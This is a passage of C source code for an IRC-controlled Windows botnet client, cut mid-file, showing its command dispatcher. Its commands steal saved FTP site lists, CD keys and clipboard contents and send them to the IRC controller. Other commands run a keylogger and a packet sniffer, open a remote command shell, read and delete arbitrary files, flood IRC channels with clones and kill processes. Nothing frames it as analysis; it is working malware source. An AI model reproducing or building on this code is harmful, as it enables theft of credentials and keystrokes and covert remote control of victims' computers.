						fseek(f, 0, SEEK_SET); // back to start

						if (length != 1219)
						{
							sprintf(sendbuf, "[LeapFTP]: Found Sites: %s (%u bytes)\r\n", sites, length);
							irc_privmsg(sock, a[2], sendbuf, notice);
							fclose(f);
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}
			if (strcmp("wsftppro", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wsftppro.exe", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"wsftppro.exe","sites\\ws_ftp.ini"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 1219)
						{
							sprintf(sendbuf, "[WSFtpPro]: Found Sites: %s (%u bytes)\r\n", sites, length);
							irc_privmsg(sock, a[2], sendbuf, notice);
							fclose(f);
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}

			if (strcmp("wsftp", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wsftp.exe", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"wsftp.exe","ws_ftp.ini"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 1219)
						{
							sprintf(sendbuf, "[WSFtp]: Found Sites: %s (%u bytes)\r\n", sites, length);
							irc_privmsg(sock, a[2], sendbuf, notice);
							fclose(f);
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}
			else if (strcmp("r3c0nn3c7", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("[MAIN]: Reconnecting.");

				return 0;
			}
			else if (strcmp("d15c0nn3c7", a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("[MAIN]: Disconnecting.");

				return -1;
			}
			else if (strcmp("qu17", a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: Status: Ready. Bot Uptime: %s.", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				BOOL full=FALSE;
				if (a[s+1])
					if (strcmp(a[s+1],"sub") == 0)
						full=TRUE;
				threadlist(sock, a[2], notice, full);
				addlog("[THREADS]: List.");

				return repeat;
			}
			else if (strcmp("listthreads", a[s]) == 0 || strcmp("lt", a[s]) == 0) {
				listthreads(sock, a[2], notice);
				addlog("[THREADS]: Full list.");

				return repeat;
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("[MAIN]: Alias list.");

				return repeat;
			}
			else if (strcmp("tasgeel", a[s]) == 0) {
				//showlog(sock, a[2], notice, silent, a[s+1]);

				SHOWLOG showlog;
				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) 
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				sprintf(showlog.chan, a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"[LOG]: Listing log.");
				addlog(sendbuf);

				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (void *)&showlog, 0, &id);

				while (showlog.gotinfo == FALSE)
					Sleep(50);

				return 1;
			}
			else if (strcmp("clearlog", a[s]) == 0 || strcmp("clg", a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("[MAIN]: Network Info.");

				return repeat;
			}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("[MAIN]: System Info.");

				return repeat;
			}
			#endif
			else if (strcmp("r.3.m.0.v.3.ing", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: Removing Bot.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				uninstall();
				fWSACleanup();
				exit(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					sprintf(sendbuf, "[PROC]: Already running.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				} else {
					LPROC lproc;
					sprintf(lproc.chan, a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"[PROCS]: Proccess list.");
					addlog(sendbuf);

					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (void *)&lproc, 0, &id);
	
					while (lproc.gotinfo == FALSE)
						Sleep(50);
				}

				return 1;
			}
			#endif
			#ifndef NO_CDKEYS
			else if (strcmp("getcdkeys", a[s]) == 0 || strcmp("key", a[s]) == 0) {
				getcdkeys(sock,a[2],notice);
				//sprintf(sendbuf,"[CDKEYS]: Search completed.");
				//if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("uptime", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "[MAIN]: Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} 

				return repeat;
			}
			else if (strcmp("driveinfo", a[s]) == 0 || strcmp("drv", a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp("testdlls", a[s]) == 0 || strcmp("dll", a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}
			#ifdef DUMP_ENCRYPT
			else if (strcmp("encrypt", a[s]) == 0 || strcmp("enc", a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
			#endif
			#ifndef NO_REMOTECMD
			else if (strcmp("opencmd",a[s]) == 0 || strcmp("ocm", a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"[CMD]: Remote shell already running.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1) 
						sprintf(sendbuf,"[CMD]: Couldn't open remote shell.");
					else 
						sprintf(sendbuf,"[CMD]: Remote shell ready.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp("cmdstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[CMD]","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("getclip", a[s]) == 0 || strcmp("gc", a[s]) == 0) {
				sprintf(sendbuf, "-[Clipboard Data]-");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				addlog("[MAIN]: Get Clipboard.");

				return repeat;
			}
			else if (strcmp("flusharp", a[s]) == 0 || strcmp("farp", a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: ARP cache flushed.");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to flush ARP cache.");
				
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("flushdns", a[s]) == 0 || strcmp("fdns", a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: DNS cache flushed.");
					else
						_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to flush DNS cache.");
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to load dnsapi.dll.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("currentip", a[s]) == 0 || strcmp("cip", a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}

			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("flood", a[s]) == 0) {
				srand(GetTickCount());
            			if (strcmp("load", a[s+1]) == 0 && a[s+4] != NULL) {
					load_clones(a[s+2],atoi(a[s+3]),atoi(a[s+4]));
					sprintf(sendbuf, "[FLOODER] Clones Loaded to: %s:%s Amount: %s", a[s+2], a[s+3], a[s+4]);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
				if (strcmp("pm", a[s+1]) == 0 && a[s+3] != NULL) {
					char pm[256];
					strcpy(pm,replacestr(a[s+3],"_"," "));
					sprintf(sendbuf, "privmsg %s :%s", a[s+2], pm);
					clone_send(sendbuf);
				}
				if (strcmp("ct", a[s+1]) == 0 && a[s+3] != NULL) {
					char pm[256];
					strcpy(pm,replacestr(a[s+3],"_"," "));
					sprintf(sendbuf, "privmsg %s :\1%s\1", a[s+2], pm);
					clone_send(sendbuf);
				}
				if (strcmp("nt", a[s+1]) == 0 && a[s+3] != NULL) {
					char nt[256];
					strcpy(nt,replacestr(a[s+3],"_"," "));
					sprintf(sendbuf, "notice %s :%s", a[s+2], nt);
					clone_send(sendbuf);
				}
				if (strcmp("mode", a[s+1]) == 0 && a[s+3] != NULL) {
					char mode[256];
					strcpy(mode,replacestr(a[s+3],"_"," "));
					sprintf(sendbuf, "mode %s %s", a[s+2], mode);
					clone_send(sendbuf);
				}
				if (strcmp("join", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
				}
				if (strcmp("part", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "part %s", a[s+2]);
					clone_send(sendbuf);
				}
				if (strcmp("partflood", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "part %s %s", a[s+2], partline);
					clone_send(sendbuf);
				}
				if (strcmp("pnick", a[s+1]) == 0 && a[s+2] != NULL) {
				 	char nickp[56];
 					srand(GetTickCount());
 					sprintf(nickp, "%s%i", a[s+2], rand()%999999);

					sprintf(sendbuf, "NICK %s", nickp);
					clone_send(sendbuf);
				}
				if (strcmp("join/part", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					sprintf(sendbuf, "part %s %s", a[s+2], partline);
					clone_send(sendbuf);
					Sleep(rand()%1000);
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%900);
					sprintf(sendbuf, "part %s %s", a[s+2], partline);
					clone_send(sendbuf);
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%200);
					sprintf(sendbuf, "part %s %s", a[s+2], partline);
					clone_send(sendbuf);
				}
				if (strcmp("dcc", a[s+1]) == 0 && a[s+2] != NULL) {
 					srand(GetTickCount());
					sprintf(sendbuf, "PRIVMSG %s :\1DCC SEND %d.%d %d %d %d\1", a[s+2], rand()%999999, rand()%999999, rand()%999999, rand()%999999, rand()%999999);
					clone_send(sendbuf);
				}
				if (strcmp("nick", a[s+1]) == 0 && a[s+2] != NULL) {
					char buf[56];
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					clone_nick(buf);
					sprintf(sendbuf, "NICK %s", buf);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					clone_nick(buf);
					sprintf(sendbuf, "NICK %s", buf);
					clone_send(sendbuf);
					Sleep(rand()%500);
					clone_nick(buf);
					sprintf(sendbuf, "NICK %s", buf);
					clone_send(sendbuf);
				}
				if (strcmp("chgnick", a[s+1]) == 0) {
					char buf[56];
					clone_nick(buf);
					sprintf(sendbuf, "NICK %s", buf);
					clone_send(sendbuf);
				}

				if (strcmp("msg", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					sprintf(sendbuf, "privmsg %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%1000);
					sprintf(sendbuf, "privmsg %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%900);
					sprintf(sendbuf, "privmsg %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
				}
				if (strcmp("notice", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					sprintf(sendbuf, "NOTICE %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%1000);
					sprintf(sendbuf, "NOTICE %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%900);
					sprintf(sendbuf, "NOTICE %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
				}
				if (strcmp("ctcp", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					sprintf(sendbuf, "PRIVMSG %s :\1ping\1", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "PRIVMSG %s :\1version\1", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "PRIVMSG %s :\1finger\1", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "PRIVMSG %s :\1finger\1", a[s+2]);
					clone_send(sendbuf);
				}
				if (strcmp("mix", a[s+1]) == 0 && a[s+2] != NULL) {
					sprintf(sendbuf, "join %s", a[s+2]);
					clone_send(sendbuf);
					sprintf(sendbuf, "PRIVMSG %s :\1ping\1", a[s+2]);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "NOTICE %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "PRIVMSG %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
					Sleep(rand()%1300);
					sprintf(sendbuf, "NOTICE %s :%s", a[s+2], floodline);
					clone_send(sendbuf);
				}
				if (strcmp("register", a[s+1]) == 0 && a[s+3] != NULL) {
					sprintf(sendbuf, "nickserv register %s %s", a[s+2], a[s+3]);
					clone_send(sendbuf);
				}
				if (strcmp("off", a[s+1]) == 0) {
					for(i=0;i<50;i++)
					if (clone_data[i].used == TRUE && clone_data[i].sock > 0)  fclosesocket(clone_data[i].sock);
					sprintf(sendbuf, "[FLOODER] clones off ...");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				sprintf(sendbuf,"[MAIN]: Nick changed to: '%s'.",a[s+1]);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				sprintf(sendbuf,"[MAIN]: Joined channel: '%s'.",a[s+1]);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				sprintf(sendbuf,"[MAIN]: Parted channel: '%s'.",a[s+1]);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						sprintf(sendbuf,"[MAIN]: IRC Raw: %s.",y);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				for (i=s+1;i<(sizeof(a)/4);i++) {
					if (a[i]==NULL) break;
					int j=atoi(a[i]);
					BOOL threadkilled = killthread(j);

					if (threadkilled)
						sprintf(sendbuf,"[THREADS]: Killed thread: %d.",j);
					else 
						sprintf(sendbuf,"[THREADS]: Failed to kill thread: %d.",j);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}

				return repeat;
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].csock, "QUIT :later\r\n");
					Sleep(500);
					fclosesocket(threads[atoi(a[s+1])].csock);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}

				return repeat;
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", sendbuf);
				}

				return repeat;
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"[MAIN]: Prefix changed to: '%c'.",a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"[SHELL]: File opened: %s", a[s+1]);
				else
					sprintf(sendbuf,"[SHELL]: Couldn't open file: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"[MAIN]: Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "[DNS]: Lookup: %s -> %s", a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"[DNS]: Couldn't resolve hostname.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_PROCESS
			else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"[PROC]: Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("kill",a[s]) == 0 || strcmp("ki", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"[PROC]: Process killed ID: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process ID: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0) { 
				// FIX ME: Switch() result to find the error.
			  if (DeleteFile(a[s+1])) 
				  _snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Deleted '%s'.",a[s+1]);
			  else 
				  strncpy(sendbuf,PrintError("[FILE]:"),sizeof(sendbuf));

			  if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			  addlog(sendbuf);

			  return repeat;
			}
			#ifndef NO_DCC
			else if (strcmp("get", a[s]) == 0 || strcmp("gt", a[s]) == 0) {
				DCC dcc;
			    dcc.sock = sock;
				dcc.notice = notice;
				memset(dcc.host,0,sizeof(dcc.host));
				sprintf(dcc.sendto,"%s",user);
				sprintf(dcc.filename,"%s",a[s+1]);

				sprintf(sendbuf,"[DCC]: Send File: %s, User: %s.",dcc.filename,dcc.sendto);
				addlog(sendbuf);

				dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
				strncpy(threads[dcc.threadnum].file,dcc.filename,sizeof(threads[dcc.threadnum].file)-1);
				threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &dcc_send, (void *)&dcc, 0, &id);

				while (dcc.info == FALSE) 
					Sleep(50);

				return 1;
			}
			#endif
			else if (strcmp("list", a[s]) == 0) { 
				getfiles(a[s+1],sock,a[2],NULL);
				sprintf(sendbuf,"[FILE]: List: %s", a[s+1]);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
				vs vs;
				strncpy(vs.host, a[s+1], sizeof(vs.host)-1);
				if (a[s+2] != NULL) 
					strncpy(vs.referer, a[s+2], sizeof(vs.referer)-1);
				strncpy(vs.chan, a[2], sizeof(vs.chan)-1);
				vs.sock = sock;
				vs.silent = silent;
				vs.notice = notice;

				sprintf(sendbuf,"[VISIT]: URL: %s.",a[s+1]);
				addlog(sendbuf);

				vs.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
				strncpy(threads[vs.threadnum].file,vs.host,sizeof(threads[vs.threadnum].file)-1);
				threads[vs.threadnum].tHandle = CreateThread(NULL, 0, &visit, (void *)&vs, 0, &id);

				while(vs.gotinfo == FALSE)
					Sleep(50);

				return repeat;
			}
			#endif
			else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"[mIRC]: Client not open.");
						else
							sprintf(sendbuf,"[mIRC]: Command sent.");
						addlog(sendbuf);
					}
                }

				return repeat;
			}
			#ifndef NO_REMOTECMD
			else if (strcmp("cmd", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) { 
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"[CMD]: Error sending to remote shell.");
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"[CMD]: Commands: %s",y);
						addlog(sendbuf);
					}
				}
				
				return repeat;
			}
			#endif
			else if (strcmp("readfile", a[s]) == 0 || strcmp("rf", a[s]) == 0) {
				FILE *fp;
				if ((fp = fopen(a[s+1],"r")) != NULL) {
					while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
						irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
					fclose(fp);
					sprintf(sendbuf,"[MAIN]: Read file complete: %s",a[s+1]);
				} else {
					sprintf(sendbuf,"[MAIN]: Read file failed: %s",a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_PSNIFF
			else if (strcmp("psniff", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(PSNIFF_THREAD) > 0)
						sprintf(sendbuf ,"[PSNIFF]: Already running.");
					else {
						PSNIFF sniff;
						sniff.sock = sock;
						sniff.notice = notice;
						sniff.silent = silent;
						_snprintf(sniff.chan, sizeof(sniff.chan), ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))));

						sprintf(sendbuf, "[PSNIFF]: Carnivore packet sniffer active.");
						sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
						if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SniffThread, (LPVOID)&sniff, 0, &id)) {
							while(sniff.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(PSNIFF_THREAD)) > 0)
						sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_IDENT
			else if (strcmp("ident", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"[IDENT]: Already running.");
					else {
						sprintf(sendbuf,"[IDENTD]: Server running on Port: 113.");
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"[IDENTD]: Failed to start server, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"[IDENT]: Server stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[IDENT]: No thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_KEYLOG
			else if (strcmp("keylog", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0 || strcmp("file", a[s+1]) == 0) {
					if (findthreadid(KEYLOG_THREAD) > 0)
						sprintf(sendbuf ,"[KEYLOG]: Already running.");
					else {
						KEYLOG keylog;
						keylog.sock = sock;
						keylog.notice = notice;
						keylog.silent = ((strcmp("file", a[s+1]) == 0)?(TRUE):(silent));
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(channel,"")==0)?(a[2]):(channel))));

						sprintf(sendbuf, "[KEYLOG]: Key logger active.");
						keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
						if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
							while(keylog.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[KEYLOG]: Failed to start logging thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(KEYLOG_THREAD)) > 0)
						sprintf(sendbuf,"[KEYLOG]: Key logger stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[KEYLOG]: No key logger thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_NET
			else if (strcmp("net", a[s]) == 0) {
